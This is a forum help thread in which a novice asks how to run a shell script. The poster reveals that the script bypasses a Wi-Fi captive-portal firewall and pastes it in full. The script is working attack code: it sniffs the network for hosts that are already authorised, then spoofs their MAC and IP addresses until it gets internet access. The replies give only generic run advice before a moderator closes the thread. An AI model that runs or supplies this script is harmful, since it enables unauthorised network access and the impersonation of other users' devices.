---
title: "executing shell file ---No interface specified"
date: 2016-06-01
forum: General Help
---

### Post by shivam-19mishra on 2016-06-01
Hello,

I am trying to execute a shell file but in Terminal it always says " No interface specified". How can I execute this shell file? I have Vi(m) too, but I am a novice so can't get around that either. 

Thank you in advance.

---

### Post by ashwin.kj on 2016-06-01
Hi
Maybe the script doesn't specify any interpreter. If the it is based on bash commands, try using
```
bash ScriptFile
```

---

### Post by steeldriver on 2016-06-01
Where did you get the script? what is its purpose? how exactly are you executing it?

It sounds like it is expecting a command-line argument to specify a particular (network?) interface

---

### Post by shivam-19mishra on 2016-06-02
It is a script to bypass wi fi firewall by searching automatically an authorised MAC and IP address. It is based on FreeBSD, maybe that's a problem. I am executing it by going to the directory where it belongs and then typing in terminal ./wifipencap.sh. After which it gives me this output asking to specify a network interface: 

"No interface specified.
usage: ./wifipencap.sh -i interface"

The script that I am trying to execute:

```
#!/bin/sh
# Attempt to bypass a captive portal firewall by trying to find
# a host who can already get through it and spoofing 
# that host's ethernet and ip addresses.


usage() {
  echo "usage: $0 -i interface"
}


args=`getopt i: "$@"`
set -- $args


while [ $# -gt 0 ]; do
  case $1 in
    -i) interface=$2; shift ;;
    --) shift; break; ;;
    *) echo "Unknown option '$1'"; exit 1 ;;
  esac
  shift
done


if [ -z "$interface" ]; then
  echo "No interface specified."
  usage
  exit 1
fi


tmp=`mktemp /tmp/XXXXXXXXX`


ifconfig $interface down
ifconfig $interface ether 00:de:ad:be:ef:01
ifconfig $interface up
dhclient $interface


# Discover networking information
ifconfig $interface \
| awk 'BEGIN { OFS="\n" }
       $1 == "inet" { print "inet="$2, "netmask="$4, "broadcast="$6 }
       $1 == "ssid" { print "ssid="$2, "channel="$4, "bssid="$6 }
       $1 == "ether" { print "ether="$2 }' \
> $tmp


# Discover the gateway
netstat -rn | awk '/^default/ { print "gateway="$2 }' >> $tmp


eval `cat $tmp`
rm $tmp


if [ -z "$gateway" ]; then
  echo No gateway found
  exit 1
fi


# Save resolv.conf
dnsconf=`mktemp /tmp/XXXXXXXX`
cp /etc/resolv.conf $dnsconf


echo "Restore your old mac address with: "
echo "ifconfig $interface down; ifconfig $interface ether $ether; ifconfig $interface up"


echo


# Fill arp cache by pinging the broadcast address which had 33 happy laptops
# responding, which fills up my arp cache with valid entries quickly and easily.
# Pinging broadcast and multicast finds lots of clients...
echo "Looking for active nodes on the network"


pcap=`mktemp /tmp/XXXXXXXX`
tcpdump -i $interface -lenp 'icmp and icmp[icmptype] == icmp-echoreply' > $pcap 2> /dev/null &
tcpdump_pid=$!


ips=`mktemp /tmp/XXXXXXXXX`
ping -t 2 $broadcast > $ips
ping -t 2 224.0.0.1 >> $ips


kill -TERM $tcpdump_pid
cat $pcap \
| awk '/ICMP echo reply/ { print $10, $2 }' \
| sort | uniq \
| while read a; do 
  set -- $a;
  ip=$1
  ether=$2


  echo Trying $a;


  ifconfig $interface ssid "" bssid 00:00:00:00:00:00 channel 0
  ifconfig $interface delete


  ifconfig $interface down;
  ifconfig $interface ether $ether;
  ifconfig $interface up;
  ifconfig $interface ssid $ssid bssid $bssid channel $channel


  try=1;
  while [ $try -lt 5 ]; do 
    echo "Waiting for associate";
    ifconfig $interface | grep -q 'status: associated' && try=100;
    try=$(($try + 1));
    sleep 3;
  done;


  route delete default
  ifconfig $interface inet $ip netmask $netmask
  route add default $gateway
  cp $dnsconf /etc/resolv.conf


  echo 'pinging google';
  host -W 10 google.com > /dev/null && ping -t 5 google.com
  if [ $? -eq 0 ]; then
    echo "Found something that can reach the internet"
    echo "Mac: $2"
    echo "IP: $1"
    echo "Exiting... You can now get online."
    exit
  fi
done


rm $ips $ipmac
```

---

### Post by shivam-19mishra on 2016-06-02
This one isn't working either :(
@ashiwn.kj

---

### Post by howefield on 2016-06-02
Thread closed.

---

